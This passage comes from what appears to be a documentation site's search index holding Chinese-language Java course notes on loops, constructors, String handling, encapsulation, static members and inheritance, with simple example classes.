}\n}\n</code></pre> <p>\u65e0\u8bba\u662f Python \u8fd8\u662f Java \u90fd\u662f\u5f53 While \u4e2d\u7684\u6761\u4ef6\u6ee1\u8db3\u65f6\u7ee7\u7eed\u6267\u884c\u8be5 Loop</p> <p><code>while (i &lt;=10)</code> \u5f53 i \u5c0f\u4e8e 10 \u65f6\u7ee7\u7eed\u6267\u884c\u8be5\u5faa\u73af\uff0c\u6216\u76f4\u63a5\u5f53\u8fd9\u4e2a\u6761\u4ef6\u4e3a true \u65f6</p>"},{"location":"cs/java/basics/w4/#empty-statements","title":"Empty statements","text":"<pre><code>public class EmptyStatement {\n    public static void main(String[] args) {\n        ;;; // Empty statements\n        int x = 10;\n        for (x = 0; x &lt; 3; x++);\n        System.out.println(\"x=\" + x);\n    }\n}\n</code></pre> <p>\u5728 for \u5faa\u73af\u4e2d\uff0c\u5206\u53f7\u8868\u793a\u5faa\u73af\u4f53\u4e3a\u7a7a\uff0c\u5faa\u73af\u7684\u6761\u4ef6\u6ee1\u8db3\u65f6\u5e76\u4e0d\u4f1a\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002</p> <p>\u5faa\u73af\u5b8c\u540e\uff0cx \u7684\u503c\u4f1a\u88ab\u6253\u5370\u51fa\u6765\u3002</p> <p>\u8fd9\u79cd\u5199\u6cd5\u5728\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u4fdd\u6301\u4ee3\u7801\u7684\u7b80\u6d01\u6027\uff0c\u7279\u522b\u5728\u5faa\u73af\u4e2d\u4e0d\u9700\u8981\u4efb\u4f55\u989d\u5916\u64cd\u4f5c\u65f6\u3002</p> <pre><code>import java.util.Scanner;\n\npublic class EmptyForLoop {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        int x = sc.nextInt();\n        for (; x &gt; 0; --x)\n            System.out.println(\"x=\" + x);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#for-each-loops","title":"For-Each loops","text":"<pre><code>for (int num : nums) {\n    System.out.println(num);\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#continue","title":"Continue","text":"<p>continue ends execution early and goes to the next iteration</p> <pre><code>public class Continue {\n    public static void main(String[] args) {\n        for (int i = 1; i &lt;= 20; i++) {\n            if (i % 2 == 0)\n                continue;\n            System.out.println(i);\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#oop","title":"OOP","text":"<p>\u540c\u4e00\u6587\u4ef6\u5939\u4e0b\u53ef\u4ee5\u81ea\u52a8\u8bc6\u522b\u8def\u5f84\uff0c\u5176\u4ed6\u6587\u4ef6\u8def\u5f84\u9700\u8981\u5bfc\u5165</p> <pre><code>javac BankExample.java\njava BankExample\n</code></pre> <p>\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5bfb\u627e\u76f8\u5173 class \u6700\u7ec8\u76f4\u63a5\u6267\u884c Main \u6240\u5728\u7684 class \u5373\u53ef\u5f97\u5230\u7ed3\u679c</p>"},{"location":"cs/java/basics/w4/#return","title":"return","text":"<pre><code>class BankAccount3 {\n    String ownerName;\n    int balance;\n\n    void depositMoney(int amount) {\n        if (amount &lt; 0) {\n            System.out.println(\"You can't deposit a negative amount!\");\n            return;\n        }\n        balance += amount;\n    }\n}\n</code></pre> <p>return \u4f1a\u76f4\u63a5\u7ed3\u675f\u65b9\u6cd5\u7684\u6267\u884c\uff0c\u7c7b\u4f3c\u4e8e break</p>"},{"location":"cs/java/basics/w4/#constructor","title":"Constructor","text":"<pre><code>class BankAccount5 {\n    String ownerName;\n    int balance;\n\n    BankAccount5() {\n        ownerName = null;\n        balance = 0;\n    }\n}\n</code></pre> <p>\u7c7b\u5f53\u4f5c\u8bbe\u8ba1\u56fe\u7eb8\uff0c\u6a21\u5177\uff0c\u5bf9\u8c61 object / instance \u5f53\u4f5c\u5b9e\u9645\u5236\u9020\u51fa\u6765\u7684\u4e1c\u897f</p> <p>\u800c\u6784\u9020\u5668\u7528\u4e8e\u5bf9\u8c61\u7684\u521d\u59cb\u5316\u8fc7\u7a0b\uff0c\u5de5\u5382\u7528\u5176\u51c6\u5907\u597d\u521d\u59cb\u751f\u4ea7\u6b65\u9aa4</p> <ul> <li>new \u5173\u952e\u5b57\u521b\u5efa\u65b0\u5bf9\u8c61\u7684\u65f6\u5019\u88ab\u81ea\u52a8\u8c03\u7528</li> <li>\u53ef\u4ee5\u6709\u591a\u4e2a\u53c2\u6570\u4e0d\u540c\u7684 constructor</li> <li>\u6ca1\u6709\u8fd4\u56de\u7c7b\u578b</li> <li>\u6ca1\u5199 Java \u4e5f\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u5565\u4e5f\u4e0d\u505a\u65e0\u53c2\u6570\u9690\u85cf\u7684\u9ed8\u8ba4\u6784\u9020\u5668\uff0c\u5199\u4e86\u5c31\u4e0d\u518d\u63d0\u4f9b</li> </ul>"},{"location":"cs/java/basics/w4/#this","title":"this","text":"<pre><code>class BankAccount6 {\n    String ownerName;\n    int balance;\n\n    BankAccount6(String ownerName, int balance) {\n        this.ownerName = ownerName;\n        this.balance = balance;\n    }\n}\n</code></pre> <p><code>this</code> \u5173\u952e\u8bcd\u7528\u4e8e\u533a\u5206 parameters \u548c field</p> <ul> <li>field \u5c31\u662f class \u7684\u5c5e\u6027</li> <li>parameters \u53c2\u6570</li> <li><code>this.name</code> always means a field; \u628a\u7528\u6237\u4f20\u7ecf\u6765\u7684\u53c2\u6570\u4fdd\u5b58\u5728\u5b57\u6bb5\u91cc</li> </ul>"},{"location":"cs/java/basics/w5/","title":"5.0 Class","text":""},{"location":"cs/java/basics/w5/#string-type","title":"String Type","text":"<p>String \u7c7b\u578b\u7528\u4e8e\u50a8\u5b58\u4e00\u4e32 char, \u5728 Java \u4e2d String \u4e0d\u662f\u4e00\u4e2a\u57fa\u672c\u6570\u636e\u7c7b\u578b\uff0c\u5c5e\u4e8e\u4e00\u4e2a class\uff0c\u56e0\u6b64\u8fd9\u610f\u5473\u7740 String \u7684\u6bcf\u4e2a instance \u90fd\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002</p>"},{"location":"cs/java/basics/w5/#literal","title":"Literal","text":"<pre><code>String hi = \"hello\";\n</code></pre> <p>\u8fd0\u884c\u4e4b\u524d\u5c31\u5df2\u7ecf\u88ab\u7f16\u8bd1\u5668\u77e5\u9053\u5e76\u51c6\u5907\u597d\u4e86</p>"},{"location":"cs/java/basics/w5/#new","title":"New","text":"<pre><code>String s3 = new String(s);\n</code></pre> <p>String \u7c7b\u578b\u662f\u4e0d\u53ef\u53d8 immutable \u7684\uff0c\u4e00\u65e6\u88ab\u521b\u5efa\u51fa\u6765\uff0c\u5185\u5bb9\u5c31\u4e0d\u80fd\u88ab\u6539\u53d8</p> <p>\u867d\u7136\u6709\u4e9b\u65b9\u6cd5\u6bd4\u5982 <code>String s = \"Hello\" + \"World\";</code> \u4f1a\u8ba9\u4eba\u89c9\u5f97\u6539\u53d8\u4e86\u4f46\u662f\u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\u5728\u539f\u6709\u7684\u5bf9\u8c61\u4e0a\u4e0a\u8fdb\u884c\u4fee\u6539\u4e86 <code>s</code> \u800c\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u5168\u65b0\u7684 String \u5bf9\u8c61\u5b58\u653e\u7ed3\u679c\u3002\u90a3\u4e48\u5982\u679c\u5c31\u662f\u60f3\u50cf\u4fee\u6539\u6570\u7ec4\u4e00\u6837\u4fee\u6539\u5b57\u7b26\u7684\u67d0\u4e2a\u6570\u7ec4\uff0c\u5148\u5c06\u5176\u53d8\u4e3a\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4 <code>char[]</code></p> <ul> <li><code>toCharArray()</code></li> </ul> <p><code>return</code> \u4e00\u4e2a\u5b57\u7b26\u4e32\u526f\u672c</p> <p>\u6570\u7ec4\u53ef\u53d8\uff0c\u4fee\u6539\u5b8c\u6210\u540e\u53ef\u4ee5\u7528\u8fd9\u4e2a\u4fee\u6539\u8fc7\u540e\u7684\u5b57\u7b26\u6570\u7ec4\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 String \u5bf9\u8c61</p> <ul> <li><code>length()</code></li> </ul> <p>\u76f4\u63a5\u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u7684\u6570\u91cf</p> <ul> <li><code>charAt(int index)</code></li> </ul> <p>\u83b7\u53d6\u4f4d\u4e8e\u7279\u5b9a\u7d22\u5f15\u7684\u5b57\u7b26\uff0c\u4ece 0 \u5f00\u59cb</p> <ul> <li><code>substring(int start, int end)</code> \u548c <code>substring(int start)</code></li> </ul> <p>\u8fd9\u4e9b\u65b9\u6cd5\u7528\u6765\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u5b50\u4e32\uff0c<code>end</code> \u4e0d\u5305\u542b</p> <pre><code>public class Substring {\n    public static void main(String[] args) {\n        String s = \"CITS2005\"; // \u539f\u59cb\u5b57\u7b26\u4e32\n        String cits = s.substring(0, 4);\n        String code = s.substring(4);\n        System.out.println(cits + \" -- \" + code); // CITS -- 2005\n    }\n}\n</code></pre> <ul> <li><code>equals(Object other)</code></li> </ul> <p>\u6bd4\u8f83\u5bf9\u8c61\u4e2d\u7684\u5185\u5bb9</p> <pre><code>public class ToCharArrayDemo {\n\n    public static void main(String[] args) {\n        String originalString = \"Hello World\";\n        char[] charArray = originalString.toCharArray();\n        System.out.println(\"\u4f7f\u7528 toCharArray() \u8f6c\u6362\u540e\u5f97\u5230\u7684\u5b57\u7b26\u6570\u7ec4 (\u5185\u5bb9): \" + new String(charArray)); // \u8f6c\u6362\u56de String\n        if (charArray.length &gt; 6) {\n            charArray[3] = '_';\n            System.out.println(\"\u4fee\u6539\u540e\u7684\u5b57\u7b26\u6570\u7ec4 (\u5185\u5bb9): \" + new String(charArray));\n        }\n        System.out.println(\"\u9a8c\u8bc1: \u539f\u59cb\u5b57\u7b26\u4e32 originalString \u4ecd\u7136\u662f: \" + originalString);\n\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w5/#mystring-class","title":"MyString Class","text":"<p>\u4e3a\u4e86\u66f4\u597d\u7684\u7406\u89e3 String\uff0c\u5f15\u5165\u4e00\u4e2a\u7ec3\u4e60\u5982\u4f55\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2a String \u7c7b</p> <ul> <li>\u6570\u7ec4\u662f <code>.length</code></li> <li><code>String</code> \u662f <code>.length()</code></li> </ul> <pre><code>public class MyString {\n    private char[] chars;\n\n    public MyString(char[] chars) {\n        this.chars = new char[chars.length];\n        for (int i = 0; i &lt; chars.length; i++) {\n            this.chars[i] = chars[i];\n        }\n    }\n\n    public char charAt(int index) {\n        return chars[index];\n    }\n\n    public int length() {\n        return chars.length;\n    }\n\n    public boolean equals(MyString s) {\n        // \u5148\u5bf9\u6bd4\u957f\u5ea6\uff0c\u518d\u9010\u4e2a\u5bf9\u6bd4 char[] \u4e2d\u5143\u7d20\n        if (length() != s.length())\n            return false;\n        for (int i = 0; i &lt; length(); i++) {\n            if (charAt(i) != s.charAt(i))\n                return false;\n        }\n        return true;\n    }\n\n    /**\n     * \u5c06\u539f\u59cb\u5b57\u7b26\u4e32\uff08\u6216\u5176\u5185\u90e8\u5b57\u7b26\u6570\u7ec4\uff09\u4e2d\u4ece start \u7d22\u5f15\u5f00\u59cb\n     * \u5230 end - 1 \u7d22\u5f15\u7ed3\u675f\u7684\u5b57\u7b26\uff0c\u9010\u4e00\u590d\u5236\u5230\u65b0\u521b\u5efa\u7684\u5b57\u7b26\u6570\u7ec4 (newChars) \u4e2d\u3002\n     */\n    public MyString substring(int start, int end) {\n        // 1. \u8ba1\u7b97\u6240\u9700\u7a7a\u95f4\uff0c\u751f\u6210\u4e00\u4e2a\u65b0\u7684 char[] \u7528\u4e8e\u8fd4\u56de\n        char[] newChars = new char[end - start];\n        // 2. \u5faa\u73af\u904d\u5386\uff0c\u4e0d\u5305\u542b end\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5\u52a8\u6001\u540c\u65f6\u6ee1\u8db3\u4e24\u8fb9\u7684\u9700\u6c42\n        for (int i = start; i &lt; end; i++) {\n            newChars[i - start] = chars[i]; // (2, 4) 3 - 2 = chars[3]\n        }\n        return new MyString(newChars);\n    }\n\n    public MyString concatenate(MyString s) {\n        char[] newChars = new char[chars.length + s.length()];\n        for (int i = 0; i &lt; chars.length; i++) {\n            newChars[i] = chars[i];\n        }\n        for (int i = 0; i &lt; s.length(); i++) {\n            newChars[chars.length + i] = s.charAt(i);\n        }\n        return new MyString(newChars); // \u7531\u4e8e\u4e0d\u662f static \u8981\u751f\u6210\u5bf9\u8c61\n    }\n\n    public class MyStringExample {\n        public static void main(String[] args) {\n            MyString s = new MyString(\"Hello\".toCharArray());\n            s.chars[0] = 'J';\n            for (int i = 0; i &lt; s.length(); i++)\n                System.out.println(s.charAt(i));\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w5/#private-and-public","title":"Private and Public","text":"<p>\u8f6f\u4ef6\u5de5\u7a0b\u4e24\u5927\u51c6\u5219\uff1a</p> <ul> <li>data hiding<ul> <li>\u7528 <code>private</code> \u5b9e\u73b0</li> </ul> </li> <li>encapsulation<ul> <li>\u628a\u4ee3\u7801\u548c\u6570\u636e\u6253\u5305\u6210\u5bb9\u6613\u4f7f\u7528\u7684\u5bf9\u8c61\uff0c\u8fd9\u5c31\u662f\u4e00\u4e2a\u7c7b\u3002\u6570\u636e\u9690\u85cf\u53ef\u4ee5\u4fdd\u62a4\u7528\u6237\u4e0d\u53d7\u590d\u6742\u6027\u7684\u5f71\u54cd\uff0c\u4ed6\u4eec\u53ea\u9700\u8981\u4e86\u89e3\u516c\u5171\u90e8\u5206\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u5c31\u53eb\u5c01\u88c5\u3002</li> </ul> </li> </ul> <pre><code>public class SafeArray {\n    private int size;\n    private int[] array;\n\n    public SafeArray(int size) {\n        this.size = size;\n        this.array = new int[size];\n    }\n\n    private boolean isValidIndex(int index) {\n        return index &gt;= 0 &amp;&amp; index &lt; size;\n    }\n\n    public int get(int index) {\n        if (isValidIndex(index))\n            return array[index];\n        System.out.println(\"Invalid index: \" + index);\n        return 0;\n    }\n\n    public void set(int index, int value) {\n        if (isValidIndex(index))\n            array[index] = value;\n        else\n            System.out.println(\"Invalid index: \" + index);\n    }\n}\n</code></pre> <p>\u7528 <code>void</code> <code>set</code> \u4ee5\u53ca <code>get</code> \u5b9e\u73b0\u6709\u9650\u5ea6\u7684 <code>public</code> \u8bbf\u95ee\u673a\u5236</p>"},{"location":"cs/java/basics/w5/#pass-by-reference","title":"Pass by reference","text":"<ul> <li>\u4e0a\u6b21\u8bfe\u6211\u4eec\u770b\u5230\u4e86\u65b9\u6cd5\u548c\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u662f\u7c7b</li> <li>\u8fd9\u610f\u5473\u7740\u4f20\u9012\u8fdb\u6765\u7684\u503c\u662f\u5bf9\u8c61</li> <li>\u8981\u7406\u89e3\u8fd9\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u503c\u4f20\u9012\u548c\u5f15\u7528\u4f20\u9012</li> <li>\u6211\u4eec\u5df2\u7ecf\u770b\u5230\uff0c\u5b58\u50a8\u5bf9\u8c61\u7684\u53d8\u91cf\uff08\u6216\u6570\u7ec4\uff09\u5b9e\u9645\u4e0a\u5b58\u50a8\u7684\u662f\u5f15\u7528</li> <li>\u5b58\u50a8\u539f\u59cb\u7c7b\u578b\u7684\u53d8\u91cf\u76f4\u63a5\u5b58\u50a8\u503c</li> <li>\u8fd9\u662f\u4e00\u6837\u7684\u3002\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f1a\u88ab\u590d\u5236\uff08\u503c\u4f20\u9012\uff09\uff0c\u5bf9\u8c61\u5219\u4f1a\u88ab\u5f15\u7528\uff08\u5f15\u7528\u4f20\u9012\uff09</li> <li>\u8fd9\u5f88\u6709\u9053\u7406\u3002\u539f\u59cb\u7c7b\u578b\u901a\u5e38\u590d\u5236\u8d77\u6765\u66f4\u9ad8\u6548\uff08\u6bd4\u5982\u4e00\u4e2a int\uff09\uff0c\u4f46\u5bf9\u8c61\u901a\u5e38\u8981\u5927\u5f97\u591a</li> </ul> <pre><code>public void copyInto(SafeArray other) {\n    if (other.size != size) {\n        System.out.println(\"Arrays are not the same size\");\n        return;\n    }\n    for (int i = 0; i &lt; size; i++) {\n        other.array[i] = array[i];\n    }\n}\n</code></pre> <p>\u4f20\u9012\u4e86\u4e00\u4e2a <code>SafeArray</code> \u7c7b\u578b\u7684\u6570\u7ec4\u5bf9\u8c61\uff0c\u786e\u4fdd\u5927\u5c0f\u4e00\u81f4\u540e\u5f00\u59cb\u5c06\u8f93\u5165\u5bf9\u8c61\u6570\u7ec4\u66ff\u6362</p> <p><code>public</code> \u65b9\u6cd5\u4e00\u6837\u53ef\u4ee5\u63a5\u5165 <code>private</code> \u53d8\u91cf\uff0c\u53ea\u8981\u662f\u5728\u540c\u4e00\u4e2a\u7c7b\u4e2d</p>"},{"location":"cs/java/basics/w5/#return-by-reference","title":"Return by reference","text":"<pre><code>public SafeArray append(int value) {\n    SafeArray newArray = new SafeArray(size + 1);\n    for (int i = 0; i &lt; size; i++)\n        newArray.array[i] = array[i];\n    newArray.array[size] = value;\n    return newArray;\n}\n</code></pre> <p>\u5b9e\u73b0\u4e00\u4e2a\u548c <code>python</code> \u4e00\u6837\u7684 <code>append</code> \u65b9\u6cd5\u9700\u8981\u8003\u8651\u5185\u5b58\uff0c\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u5730\u5740</p>"},{"location":"cs/java/basics/w5/#overloading","title":"Overloading","text":"<ul> <li>\u5728 Java \u91cc\uff0c\u597d\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u53eb\u540c\u4e00\u4e2a\u540d\u5b57\u3002</li> <li>\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u91cd\u8f7d\u3002</li> <li>\u53ea\u8981\u5b83\u4eec\u7684\u53c2\u6570\u4e0d\u4e00\u6837\uff0cJava \u5c31\u80fd\u77e5\u9053\u4f60\u60f3\u8c03\u7528\u54ea\u4e2a\u3002</li> </ul> <p>\u6bd4\u5982\u8bf4\u5982\u679c\u4e0d\u8fd4\u56de\u5bf9\u8c61\u518d\u5efa\u7acb\u4e00\u4e2a <code>void</code> \u540c\u540d\u51fd\u6570 <code>append</code></p> <p>\u6bd4\u5982\u5efa\u7acb\u4e00\u4e2a\u4e0d\u540c\u53c2\u6570\u7684 constructor, \u90fd\u53ef\u4ee5\u88ab\u81ea\u52a8\u8bc6\u522b</p>"},{"location":"cs/java/basics/w5/#recursion","title":"Recursion","text":"<pre><code>public class Fibonacci {\n    public static void main(String[] args) {\n        Fibonacci f = new Fibonacci();\n        for (int i = 1; i &lt;= 10; i++)\n            System.out.println(f.fib(i));\n    }\n\n    public int fib(int n) {\n        if (n &lt;= 2)\n            return 1;\n        else\n            return fib(n - 1) + fib(n - 2);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w5/#static","title":"static","text":"<p>\u8be5\u7279\u6b8a\u5b57\u7b26\u53ea\u5c5e\u4e8e\u7c7b\uff0c\u4e0d\u5c5e\u4e8e\u5bf9\u8c61</p> <p><code>ClassName.myStaticMethod</code></p> <pre><code>public class StaticFib {\n    public static void main(String[] args) {\n        for (int i = 1; i &lt;= 10; i++)\n            System.out.println(StaticFib.fib(i));\n    }\n\n    public static int fib(int n) {\n        if (n &lt;= 2)\n            return 1;\n        else\n            return fib(n - 1) + fib(n - 2);\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c 4 \u884c\u76f4\u63a5\u8c03\u7528\u7684\u662f\u7c7b\u540d\uff0c\u5982\u679c\u4e0d\u5199\u7c7b\u540d\u76f4\u63a5\u7528 <code>fib(i)</code> \u81ea\u52a8\u67e5\u8be2\u5f53\u524d\u7c7b\u662f\u5426\u6709\u8be5\u65b9\u6cd5</p>"},{"location":"cs/java/basics/w5/#static-fields","title":"Static Fields","text":"<pre><code>public class StaticX {\n    public static String x;\n}\n</code></pre> <p><code>StaticX.x</code> \u4e5f\u662f\u8fd9\u6837\u8bbf\u95ee</p> <p>\u65e0\u8bba\u4f60\u521b\u5efa\u591a\u5c11\u4e2a\u8be5\u7c7b\u7684\u5bf9\u8c61\uff0c\u6216\u8005\u6839\u672c\u4e0d\u521b\u5efa\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u9759\u6001\u5b57\u6bb5\u90fd\u53ea\u6709\u4e00\u4efd\u5b58\u50a8\u7a7a\u95f4\uff0c\u5b58\u5728\u4e8e\u7c7b\u7ea7\u522b\u3002\u4e0d\u50cf\u5b9e\u4f8b\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u90a3\u4e00\u4efd\u3002\u6240\u6709\u5b9e\u4f8b\u90fd\u5171\u4eab\u540c\u4e00\u4e2a\u5b57\u6bb5\uff1a\u56e0\u4e3a\u9759\u6001\u5b57\u6bb5\u53ea\u6709\u4e00\u4efd\u3002</p> <pre><code>public class StaticXTest {\n    public static void main(String[] args) {\n        StaticX instance = new StaticX();\n        StaticX instance2 = new StaticX();\n        instance.x = \"Hello\";\n        instance2.x = \"Goodbye\";\n        StaticX.x = \"World\";\n        System.out.println(StaticX.x + \" \" + instance.x + \" \" + instance2.x);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/","title":"6.0 Inheritance","text":""},{"location":"cs/java/basics/w6/#inheritance","title":"Inheritance","text":"<ul> <li>code reuse and abstraction</li> <li>A subclass inherits all the members (fields and methods, not constructors) of its superclass</li> </ul>"},{"location":"cs/java/basics/w6/#basicsafearray","title":"BasicSafeArray","text":"<pre><code>public class BasicSafeArray {\n    protected int size;\n    protected int[] array;\n\n    public BasicSafeArray(int size) {\n        // see full code\n    }\n\n    public int size() {\n        // see full code\n    }\n\n    protected boolean isValidIndex(int index) {\n        // see full code\n    }\n\n    public int get(int index) {\n        // see full code\n    }\n\n    public void set(int index, int value) {\n        // see full code\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/#appendablesafearray","title":"AppendableSafeArray","text":"<pre><code>public class AppendableSafeArray extends BasicSafeArray {\n    // Constructor\n    AppendableSafeArray(int size) {\n        super(size);\n    }\n\n    // Method to append a value\n    public void append(int value) {\n        int newSize = size + 1;\n        int[] newArray = new int[newSize];\n\n        // Copying old array elements to new array\n        for (int i = 0; i &lt; size; i++) {\n            newArray[i] = array[i];\n        }\n\n        // Adding the new value\n        newArray[size] = value;\n\n        // Updating size and array reference\n        size = newSize;\n        array = newArray;\n    }\n\n    // Main method for testing\n    public static void main(String[] args) {\n        AppendableSafeArray safeArray = new AppendableSafeArray(5);\n        safeArray.append(10);\n        // You can add more test cases here\n    }\n}\n</code></pre> <ul> <li>\u7528 <code>extends</code> \u5173\u952e\u8bcd\u7ee7\u627f\u975e <code>private</code> \u65b9\u6cd5\u4e0e\u5b57\u6bb5</li> <li>\u7b2c\u4e09\u884c\u53ef\u4ee5\u770b\u5230\u9700\u8981\u81ea\u5df1\u91cd\u5199 <code>constructor</code> </li> <li>\u4f7f\u7528 <code>super</code> \u8c03\u7528\u7236\u7c7b <code>constructor</code> \u5b9e\u73b0\u521d\u59cb\u5316 <code>field size</code> </li> </ul>"},{"location":"cs/java/basics/w6/#protected","title":"protected","text":"<p><code>protected</code>is similar to private, but can be accessed by subclasses</p> <p>\u4f46\u662f\u6709\u4e00\u4e9b\u4f8b\u5916\uff0c\u8ba8\u8bba\u5305\u65f6\u518d\u8be6\u7ec6\u8ba8\u8bba\uff0c\u53e6\u5916\u7c7b\u3001\u65b9\u6cd5\u3001\u5b57\u6bb5\u5982\u679c\u4e0d\u5199\u6743\u9650\u9ed8\u8ba4\u79c1\u6709</p>"},{"location":"cs/java/basics/w6/#field-initialisation","title":"Field Initialisation","text":"<p>\u5373\u4f7f\u6ca1\u6709 <code>constructor</code>\u624b\u52a8\u521d\u59cb\u5316 Java \u4e5f\u4f1a\u81ea\u52a8\u52a0\u4e00\u4e2a\uff0c\u56e0\u6b64\u6253\u5370\u51fa\u6765\u5b57\u6bb5\u503c\u662f\u96f6</p> <ul> <li>\u5b57\u6bb5\u7684\u5de5\u4f5c\u65b9\u5f0f\u548c\u6570\u7ec4\u5dee\u4e0d\u591a\u3002\u5728\u5bf9\u8c61\u6784\u5efa\u4e4b\u524d\uff0c\u5b83\u4eec\u4f1a\u88ab\u521d\u59cb\u5316\u6210\u4e00\u4e9b\u9ed8\u8ba4\u503c</li> <li>\u6240\u6709\u6570\u503c\u7c7b\u578b\uff08\u6bd4\u5982<code>int\u3001long\u3001char\u3001double\u3001float</code> \u7b49\u7b49\uff09\u90fd\u4f1a\u88ab\u521d\u59cb\u5316\u6210\u96f6</li> <li>\u5e03\u5c14\u503c\u4f1a\u88ab\u8bbe\u7f6e\u4e3a <code>false</code></li> <li>\u5bf9\u8c61\u548c\u6570\u7ec4\u4f1a\u88ab\u8bbe\u7f6e\u4e3a <code>null</code></li> </ul>"},{"location":"cs/java/basics/w6/#superclass-constructors","title":"Superclass Constructors","text":"<pre><code>public class AppendableSafeArray extends BasicSafeArray {\n    AppendableSafeArray(int size) {\n        this.size = size;\n        this.array = new int[size];\n    }\n}\n</code></pre> <pre><code>AppendableSafeArray.java:2: error: constructor BasicSafeArray in\nclass BasicSafeArray cannot be applied to given types; ... etc\n</code></pre> <ul> <li>Java \u6709\u4e2a\u89c4\u77e9\uff1a\u5f53\u4f60\u521b\u5efa\u5b50\u7c7b\u5b9e\u4f8b\u65f6\uff0c\u5b83\u5fc5\u987b\u5148\u53bb\u8c03\u7528\u7236\u7c7b\u7684\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u6765\u5b8c\u6210\u7236\u7c7b\u90e8\u5206\u7684\u521d\u59cb\u5316\u3002\u5982\u679c\u4f60\u4e0d\u660e\u786e\u544a\u8bc9\u5b83\u8c03\u7528\u54ea\u4e2a\uff0cJava \u5c31\u9ed8\u8ba4\u53bb\u8c03\u7528\u7236\u7c7b\u7684\u65e0\u53c2\u6570\u6784\u9020\u51fd\u6570\uff08\u5c31\u662f <code>BasicSafeArray()</code> \u8fd9\u79cd\u62ec\u53f7\u91cc\u5565\u4e5f\u6ca1\u6709\u7684\uff09\u3002</li> <li>\u8fd9\u6bb5\u4ee3\u7801\u91cc\u7684\u7236\u7c7b <code>BasicSafeArray</code> \u5f88\u53ef\u80fd\u6ca1\u6709\u63d0\u4f9b\u4e00\u4e2a\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff0c\u6216\u8005\u5b83\u6709\u4e00\u4e2a\u9700\u8981\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff0c\u5bfc\u81f4 Java \u627e\u4e0d\u5230\u5b83\u60f3\u9ed8\u8ba4\u8c03\u7528\u7684\u90a3\u4e2a <code>BasicSafeArray()</code>\u3002\u6240\u4ee5\u5c31\u62a5\u9519\u8bf4\uff1a\u201c\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6ca1\u6cd5\u7528\u554a\uff01\u201d</li> <li>\u4e3a\u4e86\u89e3\u51b3\u4e0a\u9762\u7684\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5728\u7236\u7c7b <code>BasicSafeArray</code> \u91cc\u9762\u660e\u786e\u5730\u6dfb\u52a0\u4e00\u4e2a\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570</li> </ul> <pre><code>public BasicSafeArray() {\n    this(0);\n}\n</code></pre> <ul> <li><code>this(0);</code> \u7279\u6b8a\u7528\u6cd5\uff0c\u5c31\u662f\u53bb\u8c03\u7528\u540c\u4e00\u4e2a\u7c7b <code>BasicSafeArray</code> \u4e2d\u90a3\u4e2a\u9700\u8981\u4e00\u4e2a\u6574\u6570\uff08\u8fd9\u91cc\u662f0\uff09\u4f5c\u4e3a\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u3002\u8fd9\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u6280\u5de7\uff0c\u7528\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u53bb\u8c03\u7528\u53e6\u4e00\u4e2a\uff0c\u907f\u514d\u4ee3\u7801\u91cd\u590d\u3002<ul> <li>\u5982\u679c\u4f60\u5728\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u91cc\u60f3\u7528 <code>this(...)</code>\uff08\u8c03\u7528\u81ea\u5df1\u7c7b\u7684\u5176\u4ed6\u6784\u9020\u51fd\u6570\uff09\u6216\u8005 <code>super(...)</code>\uff08\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff09\uff0c\u90a3\u4e48\u8fd9\u53e5\u8c03\u7528\u5fc5\u987b\u5199\u5728\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u7684\u7b2c\u4e00\u884c\uff01\u4e0d\u80fd\u5728\u5b83\u524d\u9762\u5199\u4efb\u4f55\u5176\u4ed6\u7684\u4ee3\u7801</li> </ul> </li> </ul>"},{"location":"cs/java/basics/w6/#hiding-memebrs","title":"Hiding Memebrs","text":"<ul> <li>super \u6765\u8bbf\u95ee\u8d85\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3001\u6210\u5458\u53d8\u91cf\u6216\u65b9\u6cd5<ul> 